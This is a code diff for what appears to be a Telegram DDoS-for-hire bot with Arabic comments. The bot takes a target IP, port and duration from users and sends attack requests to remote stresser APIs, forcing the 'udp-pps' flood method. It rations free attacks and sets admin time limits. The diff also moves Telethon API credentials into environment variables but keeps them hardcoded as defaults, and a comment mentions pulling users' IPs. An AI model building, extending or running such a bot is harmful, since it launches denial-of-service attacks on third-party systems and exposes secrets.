@@ -1,5 +1,6 @@
 import asyncio
 import json as _json
+import os
 import random as _random
 import threading
 import time
@@ -67,9 +68,10 @@ attack_limits_config = {
     "admin_max_time": 3600,
 }
 
-# إعدادات تليثون وسحب الـ IP
-API_ID = 2040
-API_HASH = "b18441a1ff607e10a989891a5462e627"
+# إعدادات تليثون وسحب الـ IP (تسحب من متغيرات البيئة أو القيم الافتراضية)
+API_ID = int(os.environ.get("API_ID", 39424449))
+API_HASH = os.environ.get("API_HASH", "8051b83850477396b863299a5ea103db")
+
 user_telethon_sessions = {}
 public_sessions = []
 keep_alive_sessions = {}
@@ -1433,7 +1435,6 @@ def handle_admin_inputs(message):
         user_attempts[user_id]["attempts_left"] -= 1
       max_time = attack_limits_config["free_max_time"]
 
-    # تثبيت طريقة الهجوم على udp-pps دائماً للهجوم القوي
     method = "udp-pps"
 
     attack_result_msg = (
@@ -1454,7 +1455,6 @@ def handle_admin_inputs(message):
     success_api = False
     for srv in api_servers:
       try:
-        # إرسال البارامترات بالطريقة الصحيحة تماماً
         target_api_url = f"{srv['url']}?username={srv['username']}&password={srv['password']}&target={target_ip}&port={port}&time={max_time}&method={method}"
         response = requests.get(target_api_url, timeout=7)
         if response.status_code in [200, 201, 202]:
@@ -1631,7 +1631,6 @@ def handle_attack(message):
     )
     return
 
-  # تحويل أي طلب يحتوي على udp إلى udp-pps تلقائياً
   if "udp" in method.lower():
     method = "udp-pps"
 
@@ -1689,7 +1688,6 @@ def handle_attack(message):
   success_api = False
   for srv in api_servers:
     try:
-      # تصحيح بناء الرابط تماماً ليطابق الكود الصحيح
       target_api_url = f"{srv['url']}?username={srv['username']}&password={srv['password']}&target={target_ip}&port={port}&time={time_sec}&method={method.lower()}"
       response = requests.get(target_api_url, timeout=7)
       if response.status_code in [200, 201, 202]:
@@ -1714,5 +1712,5 @@ def handle_attack(message):
 
 
 if __name__ == "__main__":
-  print("🤖 تم تشغيل البوت وإصلاح مشكلة الاتصال بالـ API نهائياً...")
+  print("🤖 تم تشغيل البوت بنجاح عبر متغيرات البيئة...")
   bot.infinity_polling()
